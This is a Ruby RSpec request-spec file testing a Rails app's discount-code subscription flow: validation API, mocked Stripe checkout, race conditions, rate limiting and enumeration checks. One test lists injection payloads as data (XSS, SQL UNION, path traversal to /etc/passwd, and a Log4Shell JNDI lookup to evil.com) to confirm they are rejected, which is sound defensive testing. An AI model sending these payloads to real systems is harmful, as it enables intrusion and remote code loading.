require 'rails_helper'

RSpec.describe 'Discount Code Subscription Integration', type: :request do
  let(:user) { create(:user, subscription_tier: 'freemium') }
  let(:discount_code) { create(:discount_code, code: 'WELCOME20', discount_percentage: 20, active: true) }

  before do
    sign_in user
  end

  describe 'Subscription flow with discount codes' do
    context 'when applying a valid discount code' do
      it 'validates the discount code via API' do
        post '/api/v1/discount_codes/validate', params: {
          code: 'WELCOME20',
          billing_cycle: 'monthly'
        }

        expect(response).to have_http_status(:success)
        
        json_response = JSON.parse(response.body)
        expect(json_response['valid']).to be true
        expect(json_response['discount_code']['code']).to eq('WELCOME20')
        expect(json_response['pricing']['original_amount']).to eq(2900)
        expect(json_response['pricing']['discount_amount']).to eq(580)
        expect(json_response['pricing']['final_amount']).to eq(2320)
      end

      it 'creates subscription with discount code' do
        # Mock Stripe customer creation
        stripe_customer = double('Stripe::Customer', id: 'cus_test123')
        allow_any_instance_of(Stripe::StripeClient).to receive_message_chain(:customers, :create)
          .and_return(stripe_customer)

        # Mock Stripe coupon creation
        stripe_coupon = double('Stripe::Coupon', id: 'discount_welcome20_20pct')
        allow_any_instance_of(Stripe::StripeClient).to receive_message_chain(:coupons, :retrieve)
          .and_raise(Stripe::InvalidRequestError.new('Not found', 'coupon'))
        allow_any_instance_of(Stripe::StripeClient).to receive_message_chain(:coupons, :create)
          .and_return(stripe_coupon)

        # Mock Stripe checkout session creation
        stripe_session = double('Stripe::CheckoutSession', 
          id: 'cs_test123', 
          url: 'https://checkout.stripe.com/pay/cs_test123'
        )
        allow_any_instance_of(Stripe::StripeClient).to receive_message_chain(:checkout, :sessions, :create)
          .and_return(stripe_session)

        post '/subscription_management', params: {
          billing_cycle: 'monthly',
          discount_code: 'WELCOME20'
        }

        expect(response).to redirect_to('https://checkout.stripe.com/pay/cs_test123')
      end

      it 'includes discount information in Stripe session metadata' do
        # Mock Stripe services
        stripe_customer = double('Stripe::Customer', id: 'cus_test123')
        allow_any_instance_of(Stripe::StripeClient).to receive_message_chain(:customers, :create)
          .and_return(stripe_customer)

        stripe_coupon = double('Stripe::Coupon', id: 'discount_welcome20_20pct')
        allow_any_instance_of(Stripe::StripeClient).to receive_message_chain(:coupons, :retrieve)
          .and_raise(Stripe::InvalidRequestError.new('Not found', 'coupon'))
        allow_any_instance_of(Stripe::StripeClient).to receive_message_chain(:coupons, :create)
          .and_return(stripe_coupon)

        stripe_session = double('Stripe::CheckoutSession', 
          id: 'cs_test123', 
          url: 'https://checkout.stripe.com/pay/cs_test123'
        )

        # Expect the checkout session to be created with discount metadata
        expect_any_instance_of(Stripe::StripeClient).to receive_message_chain(:checkout, :sessions, :create) do |params|
          expect(params[:metadata][:discount_code]).to eq('WELCOME20')
          expect(params[:metadata][:discount_percentage]).to eq(20)
          expect(params[:metadata][:original_amount]).to eq(2900)
          expect(params[:metadata][:discount_amount]).to eq(580)
          expect(params[:metadata][:final_amount]).to eq(2320)
          expect(params[:discounts]).to eq([{ coupon: 'discount_welcome20_20pct' }])
          stripe_session
        end

        post '/subscription_management', params: {
          billing_cycle: 'monthly',
          discount_code: 'WELCOME20'
        }

        expect(response).to redirect_to('https://checkout.stripe.com/pay/cs_test123')
      end
    end

    context 'when applying an invalid discount code' do
      it 'returns error for invalid code during subscription creation' do
        post '/subscription_management', params: {
          billing_cycle: 'monthly',
          discount_code: 'INVALID'
        }

        expect(response).to redirect_to('/subscription_management')
        expect(flash[:alert]).to include('Invalid discount code')
      end

      it 'returns error for user who already used a discount' do
        user.update!(discount_code_used: true)

        post '/subscription_management', params: {
          billing_cycle: 'monthly',
          discount_code: 'WELCOME20'
        }

        expect(response).to redirect_to('/subscription_management')
        expect(flash[:alert]).to include('already used')
      end
    end

    context 'when no discount code is provided' do
      it 'creates subscription without discount' do
        # Mock Stripe services
        stripe_customer = double('Stripe::Customer', id: 'cus_test123')
        allow_any_instance_of(Stripe::StripeClient).to receive_message_chain(:customers, :create)
          .and_return(stripe_customer)

        stripe_session = double('Stripe::CheckoutSession', 
          id: 'cs_test123', 
          url: 'https://checkout.stripe.com/pay/cs_test123'
        )

        # Expect the checkout session to be created without discount metadata
        expect_any_instance_of(Stripe::StripeClient).to receive_message_chain(:checkout, :sessions, :create) do |params|
          expect(params[:metadata]).not_to have_key(:discount_code)
          expect(params).not_to have_key(:discounts)
          stripe_session
        end

        post '/subscription_management', params: {
          billing_cycle: 'monthly'
        }

        expect(response).to redirect_to('https://checkout.stripe.com/pay/cs_test123')
      end
    end
  end

  describe 'Real-time discount validation' do
    it 'provides immediate feedback for valid codes' do
      post '/api/v1/discount_codes/validate', params: {
        code: 'WELCOME20',
        billing_cycle: 'monthly'
      }

      expect(response).to have_http_status(:success)
      
      json_response = JSON.parse(response.body)
      expect(json_response['valid']).to be true
      expect(json_response['pricing']['final_amount']).to be < json_response['pricing']['original_amount']
    end

    it 'provides immediate feedback for invalid codes' do
      post '/api/v1/discount_codes/validate', params: {
        code: 'INVALID',
        billing_cycle: 'monthly'
      }

      expect(response).to have_http_status(:unprocessable_entity)
      
      json_response = JSON.parse(response.body)
      expect(json_response['valid']).to be false
      expect(json_response['error']).to be_present
    end

    it 'handles different billing cycles correctly' do
      # Test monthly
      post '/api/v1/discount_codes/validate', params: {
        code: 'WELCOME20',
        billing_cycle: 'monthly'
      }

      monthly_response = JSON.parse(response.body)
      expect(monthly_response['pricing']['original_amount']).to eq(2900)

      # Test yearly
      post '/api/v1/discount_codes/validate', params: {
        code: 'WELCOME20',
        billing_cycle: 'yearly'
      }

      yearly_response = JSON.parse(response.body)
      expect(yearly_response['pricing']['original_amount']).to eq(29000)
      
      # Verify discount percentage is the same
      expect(monthly_response['discount_code']['discount_percentage'])
        .to eq(yearly_response['discount_code']['discount_percentage'])
    end

    it 'handles case insensitive discount codes' do
      post '/api/v1/discount_codes/validate', params: {
        code: 'welcome20',
        billing_cycle: 'monthly'
      }

      expect(response).to have_http_status(:success)
      
      json_response = JSON.parse(response.body)
      expect(json_response['valid']).to be true
      expect(json_response['discount_code']['code']).to eq('WELCOME20')
    end

    it 'validates user eligibility in real-time' do
      # User already used a discount
      user.update!(discount_code_used: true)

      post '/api/v1/discount_codes/validate', params: {
        code: 'WELCOME20',
        billing_cycle: 'monthly'
      }

      expect(response).to have_http_status(:unprocessable_entity)
      
      json_response = JSON.parse(response.body)
      expect(json_response['valid']).to be false
      expect(json_response['error']).to include('already used a discount code')
    end
  end

  describe 'Concurrent usage scenarios' do
    let(:limited_code) { create(:discount_code, code: 'LIMITED', max_usage_count: 2, current_usage_count: 0) }
    let(:users) { create_list(:user, 5, subscription_tier: 'freemium', discount_code_used: false) }

    it 'handles multiple users competing for limited discount codes' do
      results = []
      threads = []

      users.each do |test_user|
        threads << Thread.new do
          # Sign in each user
          post '/users/sign_in', params: {
            user: { email: test_user.email, password: test_user.password }
          }

          # Try to validate the limited discount
          post '/api/v1/discount_codes/validate', params: {
            code: 'LIMITED',
            billing_cycle: 'monthly'
          }

          results << {
            user: test_user,
            status: response.status,
            valid: response.status == 200 ? JSON.parse(response.body)['valid'] : false
          }
        end
      end

      threads.each(&:join)

      # All users should be able to validate initially
      valid_validations = results.count { |r| r[:valid] }
      expect(valid_validations).to be >= 2

      # But only 2 should be able to actually use it
      successful_applications = 0
      results.select { |r| r[:valid] }.first(3).each do |result|
        test_user = result[:user]
        
        # Mock Stripe services for subscription creation
        stripe_customer = double('Stripe::Customer', id: "cus_#{test_user.id}")
        allow_any_instance_of(Stripe::StripeClient).to receive_message_chain(:customers, :create)
          .and_return(stripe_customer)

        stripe_coupon = double('Stripe::Coupon', id: 'discount_limited_20pct')
        allow_any_instance_of(Stripe::StripeClient).to receive_message_chain(:coupons, :retrieve)
          .and_raise(Stripe::InvalidRequestError.new('Not found', 'coupon'))
        allow_any_instance_of(Stripe::StripeClient).to receive_message_chain(:coupons, :create)
          .and_return(stripe_coupon)

        stripe_session = double('Stripe::CheckoutSession', 
          id: "cs_#{test_user.id}", 
          url: "https://checkout.stripe.com/pay/cs_#{test_user.id}"
        )
        allow_any_instance_of(Stripe::StripeClient).to receive_message_chain(:checkout, :sessions, :create)
          .and_return(stripe_session)

        # Sign in the user
        post '/users/sign_in', params: {
          user: { email: test_user.email, password: test_user.password }
        }

        # Try to create subscription with discount
        post '/subscription_management', params: {
          billing_cycle: 'monthly',
          discount_code: 'LIMITED'
        }

        if response.status == 302 && response.location.include?('checkout.stripe.com')
          successful_applications += 1
        end
      end

      expect(successful_applications).to eq(2)
    end

    it 'prevents race conditions in discount application' do
      # Create a discount with only 1 use remaining
      single_use_code = create(:discount_code, code: 'SINGLE', max_usage_count: 1, current_usage_count: 0)
      
      user1 = create(:user, subscription_tier: 'freemium', discount_code_used: false)
      user2 = create(:user, subscription_tier: 'freemium', discount_code_used: false)

      results = []
      threads = []

      [user1, user2].each do |test_user|
        threads << Thread.new do
          # Sign in user
          post '/users/sign_in', params: {
            user: { email: test_user.email, password: test_user.password }
          }

          # Mock Stripe services
          stripe_customer = double('Stripe::Customer', id: "cus_#{test_user.id}")
          allow_any_instance_of(Stripe::StripeClient).to receive_message_chain(:customers, :create)
            .and_return(stripe_customer)

          stripe_coupon = double('Stripe::Coupon', id: 'discount_single_20pct')
          allow_any_instance_of(Stripe::StripeClient).to receive_message_chain(:coupons, :retrieve)
            .and_raise(Stripe::InvalidRequestError.new('Not found', 'coupon'))
          allow_any_instance_of(Stripe::StripeClient).to receive_message_chain(:coupons, :create)
            .and_return(stripe_coupon)

          stripe_session = double('Stripe::CheckoutSession', 
            id: "cs_#{test_user.id}", 
            url: "https://checkout.stripe.com/pay/cs_#{test_user.id}"
          )
          allow_any_instance_of(Stripe::StripeClient).to receive_message_chain(:checkout, :sessions, :create)
            .and_return(stripe_session)

          # Try to create subscription with discount
          post '/subscription_management', params: {
            billing_cycle: 'monthly',
            discount_code: 'SINGLE'
          }

          results << {
            user: test_user,
            status: response.status,
            success: response.status == 302 && response.location.include?('checkout.stripe.com')
          }
        end
      end

      threads.each(&:join)

      # Only one should succeed
      successful_count = results.count { |r| r[:success] }
      expect(successful_count).to eq(1)

      # The discount code should be exhausted
      single_use_code.reload
      expect(single_use_code.current_usage_count).to eq(1)
      expect(single_use_code.active?).to be false
    end
  end

  describe 'Error handling and edge cases' do
    it 'handles expired discount codes during checkout' do
      # Create a discount that expires soon
      expiring_code = create(:discount_code, code: 'EXPIRING', expires_at: 5.minutes.from_now)

      # User validates the code successfully
      post '/api/v1/discount_codes/validate', params: {
        code: 'EXPIRING',
        billing_cycle: 'monthly'
      }

      expect(response).to have_http_status(:success)

      # Time passes and code expires
      travel 10.minutes do
        # User tries to create subscription with expired code
        post '/subscription_management', params: {
          billing_cycle: 'monthly',
          discount_code: 'EXPIRING'
        }

        expect(response).to redirect_to('/subscription_management')
        expect(flash[:alert]).to include('expired')
      end
    end

    it 'handles service unavailability gracefully' do
      # Mock service failure
      allow_any_instance_of(DiscountCodeService).to receive(:validate_code).and_raise(
        StandardError.new('Service unavailable')
      )

      post '/api/v1/discount_codes/validate', params: {
        code: 'WELCOME20',
        billing_cycle: 'monthly'
      }

      expect(response).to have_http_status(:service_unavailable)
      
      json_response = JSON.parse(response.body)
      expect(json_response['error']).to include('temporarily unavailable')
    end

    it 'handles Stripe service failures during checkout' do
      # Mock Stripe failure
      allow_any_instance_of(Stripe::StripeClient).to receive_message_chain(:customers, :create)
        .and_raise(Stripe::APIError.new('Service unavailable'))

      post '/subscription_management', params: {
        billing_cycle: 'monthly',
        discount_code: 'WELCOME20'
      }

      expect(response).to redirect_to('/subscription_management')
      expect(flash[:alert]).to include('payment service is temporarily unavailable')
    end

    it 'validates discount code format and prevents injection attacks' do
      malicious_codes = [
        '<script>alert("xss")</script>',
        'UNION SELECT * FROM users',
        '../../../etc/passwd',
        '${jndi:ldap://evil.com/a}'
      ]

      malicious_codes.each do |malicious_code|
        post '/api/v1/discount_codes/validate', params: {
          code: malicious_code,
          billing_cycle: 'monthly'
        }

        expect(response).to have_http_status(:unprocessable_entity)
        expect(response.body).not_to include(malicious_code)
        
        json_response = JSON.parse(response.body)
        expect(json_response['error']).to include('Invalid discount code')
      end
    end
  end

  describe 'Analytics and tracking integration' do
    it 'tracks discount code validation attempts' do
      # Mock analytics service
      expect(Rails.logger).to receive(:info).with(/Discount code validation attempt/)

      post '/api/v1/discount_codes/validate', params: {
        code: 'WELCOME20',
        billing_cycle: 'monthly'
      }

      expect(response).to have_http_status(:success)
    end

    it 'records successful discount applications for reporting' do
      # Mock Stripe services
      stripe_customer = double('Stripe::Customer', id: 'cus_test123')
      allow_any_instance_of(Stripe::StripeClient).to receive_message_chain(:customers, :create)
        .and_return(stripe_customer)

      stripe_coupon = double('Stripe::Coupon', id: 'discount_welcome20_20pct')
      allow_any_instance_of(Stripe::StripeClient).to receive_message_chain(:coupons, :retrieve)
        .and_raise(Stripe::InvalidRequestError.new('Not found', 'coupon'))
      allow_any_instance_of(Stripe::StripeClient).to receive_message_chain(:coupons, :create)
        .and_return(stripe_coupon)

      stripe_session = double('Stripe::CheckoutSession', 
        id: 'cs_test123', 
        url: 'https://checkout.stripe.com/pay/cs_test123'
      )
      allow_any_instance_of(Stripe::StripeClient).to receive_message_chain(:checkout, :sessions, :create)
        .and_return(stripe_session)

      # Create subscription with discount
      post '/subscription_management', params: {
        billing_cycle: 'monthly',
        discount_code: 'WELCOME20'
      }

      expect(response).to redirect_to('https://checkout.stripe.com/pay/cs_test123')

      # Verify analytics data would be recorded
      expect(Rails.logger).to have_received(:info).with(/Discount code applied in checkout session/)
    end

    it 'tracks user eligibility checks' do
      # User with existing discount usage
      user.update!(discount_code_used: true)

      expect(Rails.logger).to receive(:info).with(/User eligibility check/)

      post '/api/v1/discount_codes/validate', params: {
        code: 'WELCOME20',
        billing_cycle: 'monthly'
      }

      expect(response).to have_http_status(:unprocessable_entity)
    end
  end

  describe 'Security and fraud prevention' do
    it 'implements rate limiting for discount validation' do
      # Make multiple rapid requests
      10.times do
        post '/api/v1/discount_codes/validate', params: {
          code: 'INVALID',
          billing_cycle: 'monthly'
        }
      end

      # Next request should be rate limited
      post '/api/v1/discount_codes/validate', params: {
        code: 'WELCOME20',
        billing_cycle: 'monthly'
      }

      expect(response).to have_http_status(:too_many_requests)
      
      json_response = JSON.parse(response.body)
      expect(json_response['error']).to include('rate limit')
    end

    it 'logs suspicious discount code activity' do
      # Simulate suspicious pattern
      expect(Rails.logger).to receive(:warn).with(/Suspicious discount code activity/)

      # Multiple failed attempts
      5.times do
        post '/api/v1/discount_codes/validate', params: {
          code: 'INVALID',
          billing_cycle: 'monthly'
        }
      end
    end

    it 'prevents discount code enumeration attacks' do
      # Try to enumerate discount codes
      potential_codes = ['SAVE10', 'SAVE20', 'WELCOME', 'DISCOUNT', 'PROMO']
      
      potential_codes.each do |code|
        post '/api/v1/discount_codes/validate', params: {
          code: code,
          billing_cycle: 'monthly'
        }

        # All should return the same generic error to prevent enumeration
        if response.status == 422
          json_response = JSON.parse(response.body)
          expect(json_response['error']).to eq('Invalid discount code')
        end
      end
    end
  end

  describe 'User experience and accessibility' do
    it 'provides clear error messages for different failure scenarios' do
      # Test various failure scenarios
      scenarios = [
        { code: 'INVALID', expected_error: 'Invalid discount code' },
        { code: '', expected_error: 'Discount code is required' },
        { code: 'WELCOME20', user_setup: -> { user.update!(discount_code_used: true) }, expected_error: 'already used a discount code' },
        { code: 'WELCOME20', user_setup: -> { user.update!(subscription_tier: 'premium') }, expected_error: 'Premium users cannot use discount codes' }
      ]

      scenarios.each do |scenario|
        # Reset user state
        user.update!(discount_code_used: false, subscription_tier: 'freemium')
        
        # Apply scenario-specific setup
        scenario[:user_setup]&.call

        post '/api/v1/discount_codes/validate', params: {
          code: scenario[:code],
          billing_cycle: 'monthly'
        }

        if response.status == 422
          json_response = JSON.parse(response.body)
          expect(json_response['error']).to include(scenario[:expected_error])
        end
      end
    end

    it 'maintains consistent response format across all endpoints' do
      # Test successful validation
      post '/api/v1/discount_codes/validate', params: {
        code: 'WELCOME20',
        billing_cycle: 'monthly'
      }

      success_response = JSON.parse(response.body)
      expect(success_response).to have_key('valid')
      expect(success_response).to have_key('discount_code')
      expect(success_response).to have_key('pricing')

      # Test failed validation
      post '/api/v1/discount_codes/validate', params: {
        code: 'INVALID',
        billing_cycle: 'monthly'
      }

      error_response = JSON.parse(response.body)
      expect(error_response).to have_key('valid')
      expect(error_response).to have_key('error')
      expect(error_response['valid']).to be false
    end
  end
end